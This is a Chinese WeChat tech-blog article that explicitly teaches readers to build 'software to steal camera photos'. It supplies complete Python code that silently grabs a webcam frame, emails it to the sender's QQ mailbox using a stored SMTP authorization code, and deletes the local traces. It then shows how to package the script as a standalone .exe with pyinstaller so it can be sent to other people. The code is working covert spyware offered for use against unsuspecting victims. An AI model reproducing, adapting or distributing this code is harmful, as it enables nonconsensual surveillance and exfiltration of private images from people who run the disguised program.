> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI0MzU2NzQ1OA==&mid=2247501523&idx=2&sn=fdd5328fef78fda9af33a8088717c4e9&chksm=e96998dede1e11c8d27cef1b4c670fcdc1ddaa33723c03811328672b856a031573bbcb20393a&mpshare=1&scene=1&srcid=0605JagZ0kBHMD9c2HEO7JWZ&sharer_sharetime=1622826644852&sharer_shareid=7fece245937ac96f04f0fb8e1311fff1#rd)

公众号

点击上方 "**Python 人工智能技术** " 关注，星标或者置顶

22 点 24 分准时推送，第一时间送达

后台回复 “**大礼包**”，送你特别福利  

> 编辑：技术君 | 来源：Henrik-Yao | 链接：nxw.so/5nIWK

[Pythn 人工智能技术 (ID:coder_experience) 第 514 次推文](http://mp.weixin.qq.com/s?__biz=MzI0MzU2NzQ1OA==&mid=2247489525&idx=1&sn=26e9ce9d935a845d03ce4a3d30ebc975&chksm=e96a49f8de1dc0eeda78a0f1fa1ab74bfa13222fecbb924f52e59b59cd8b431d6e0fd00cc1cb&scene=21#wechat_redirect)

上一篇：[8 年开发，连登陆接口都写这么烂...](http://mp.weixin.qq.com/s?__biz=MzI0MzU2NzQ1OA==&mid=2247501342&idx=1&sn=44200a7409acb73e89447fac3bda38dc&chksm=e9699813de1e1105db12fc0ffb859ff1df1612ce58dd18edbcac7ca77d05ffc73f37b9c0a8c3&scene=21#wechat_redirect)

**正文**

教你用 python 做一个属于自己的窃取摄像头照片的软件。  

需要安装 python3.5 以上版本，在官网下载即可。

然后安装库 opencv-python，安装方式为打开终端输入命令行。

可以在使用 pip 的时候加参数 - i https://pypi.tuna.tsinghua.edu.cn/simple，这样就会从清华这边的镜像去安装需要的库，会快很多。

```
$ pip install opencv-python -i https://pypi.tuna.tsinghua.edu.cn/simple/
```

具体的代码以及相应的注释如下，你只需要更改收件人和发件人为自己的邮箱，更改授权码，再编译成可执行文件，即把. py 打包成. exe，这样就可以发给别人用啦。

```
import os                                       # 删除文件
import cv2                                      # 调用摄像头拍摄照片
from smtplib import SMTP_SSL                    # SSL加密的   传输协议
from email.mime.text import MIMEText            # 构建邮件文本
from email.mime.multipart import MIMEMultipart  # 构建邮件体
from email.header import Header                 # 发送内容


# 调用摄像头拍摄照片
def get_photo():
    cap = cv2.VideoCapture(0)           # 开启摄像头
    f, frame = cap.read()               # 将摄像头中的一帧数据保存
    cv2.imwrite('image.jpg', frame)     # 将保存为本地文件
    cap.release()                       # 关闭摄像头


# 把文件发送到我的邮箱
def send_message():
    # 选择QQ邮箱发送照片
    host_server = 'smtp.qq.com'         # QQ邮箱smtp服务器
    pwd = '****************'            # 授权码
    from_qq_mail = 'QQ@qq.com'          # 发件人
    to_qq_mail = 'QQ@qq.com'            # 收件人
    msg = MIMEMultipart()               # 创建一封带附件的邮件

    msg['Subject'] = Header('摄像头照片', 'UTF-8')    # 消息主题
    msg['From'] = from_qq_mail                       # 发件人
    msg['To'] = Header("YH", 'UTF-8')                # 收件人
    msg.attach(MIMEText("照片", 'html', 'UTF-8'))    # 添加邮件文本信息

    # 加载附件到邮箱中  SSL 方式   加密
    image = MIMEText(open('image.jpg', 'rb').read(), 'base64', 'utf-8')
    image["Content-Type"] = 'image/jpeg'   # 附件格式为的加密数据
    msg.attach(image)                      # 附件添加

    # 开始发送邮件
    smtp = SMTP_SSL(host_server)           # 链接服务器
    smtp .login(from_qq_mail, pwd)         # 登录邮箱
    smtp.sendmail(from_qq_mail, to_qq_mail, msg.as_string())  # 发送邮箱
    smtp.quit()     # 退出


if __name__ == '__main__':
    get_photo()                 # 开启摄像头获取照片
    send_message()              # 发送照片
    os.remove('image.jpg')      # 删除本地照片
```

获取授权码的方法：设置 -> 账户 -> 开启 pop3/smtp 服务 -> 验证密保，即可获取到 16 位授权码。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jz54bibWVpwHyrVmuD7TocqIAQUceTic5UAwfY1sXyTH79ErQ9DCicWbaWqqFhZGsfW1OgyuOtwZcIKg/640?wx_fmt=png)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jz54bibWVpwHyrVmuD7TocqIebyIZ0kicVZQmCx4vsfhdxv14Ps2DPV4oeRMZhfMK595kJklxd6GlRg/640?wx_fmt=png)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jz54bibWVpwHyrVmuD7TocqIdnexFBYX8JhFh55XlhXPiaWIlleucUNLibxzZojrSU6cxdPlVoL8j63g/640?wx_fmt=png)

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jz54bibWVpwHyrVmuD7TocqIXawRzTWqw5TmVYVg8CtcBBeKLhUNeB2yanWTwRnvFjfHQic9wtnycFw/640?wx_fmt=png)

**打包方法：**

*   先安装 pyinstaller，在终端中输入 pip install pyinstaller 即可。
    
*   找路径，用 cd 法找路径比较麻烦，这里推荐一种简便的方法，直接在路径框里面输入 cmd 进入终端即可，进入了就是目标路径。
    

![图片](https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jz54bibWVpwHyrVmuD7TocqIjwYcVPI066CVhedWicMkeJ9yYuCVpmDSQ5lAibELu4GH8yUbMPLEkrfw/640?wx_fmt=png)

打包，输入命令行

搜索公众号顶级架构师后台回复 “面试”，获取一份惊喜礼包。

```
pyinstaller --console --onefile 7.py  //这里打包的是一个叫7.py的文件。
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jz54bibWVpwHyrVmuD7TocqIVXSKYSULIwkFTGzicHTvDyXLdnHWSEGD52n1EZ1wIBbsQnOc1LZWeicA/640?wx_fmt=png)

在 dist 文件夹里面即可找到可执行文件。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jz54bibWVpwHyrVmuD7TocqIHeNlKGXl9JpOPvK4C54VXv3BicTPic7YeyWZDPwvEnkBBG0DYhRecb7Q/640?wx_fmt=png)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jz54bibWVpwHyrVmuD7TocqIKOshPKy2bw9ZHf84DUiae9ZrT2BKuakOtBmene6ZMk72nSospGNzPKA/640?wx_fmt=png)

最后实验一下，会得到一个 bin 后缀的附件，把他改成 jpg 即可查看。

![图片](https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jz54bibWVpwHyrVmuD7TocqIjuy4NaSep3YL81nzvPBicTWVack4AhCHOPHgAj6ic6KJkDqMqMq4AmpA/640?wx_fmt=png)

**你还有什么想要补充的吗？**

> 免责声明：本文内容来源于网络，文章版权归原作者所有，意在传播相关技术知识 & 行业趋势，供大家学习交流，若涉及作品版权问题，请联系删除或授权事宜。

**技术君个人微信**

**添加技术君个人微信即送一份惊喜大礼包**